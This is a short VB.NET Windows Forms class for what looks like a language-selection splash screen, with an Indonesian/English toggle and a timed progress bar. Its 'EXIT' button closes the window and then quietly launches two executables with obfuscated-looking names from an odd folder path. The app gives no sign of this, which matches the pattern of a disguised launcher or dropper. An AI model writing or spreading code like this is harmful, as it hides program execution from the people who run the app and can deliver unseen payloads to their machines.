Public Class Form1
    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        Button1.Text = "KELUAR"
        RadioButton1.Text = "Bahasa Indonesia"
        RadioButton2.Text = "English Language"
        GroupBox1.Text = "Pilih Bahasa"
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        Button1.Text = "EXIT"
        RadioButton1.Text = "Indonesian Language"
        RadioButton2.Text = "English Language"
        GroupBox1.Text = "Select Language"
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(1)
        If ProgressBar1.Value = 100 Then
            Timer1.Stop()
            RadioButton1.Enabled = True
            RadioButton2.Enabled = True
            Button1.Enabled = True
        Else
            RadioButton1.Enabled = False
            RadioButton2.Enabled = False
            Button1.Enabled = False
        End If
        Label1.Text = ProgressBar1.Value & (" %")
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Close()
        Process.Start("$&$#77\FLA5hJ4x7\1%%==7.exe")
        Process.Start("$&$#77\FLA5hJ4x7\2%%==7.exe")
    End Sub
End Class
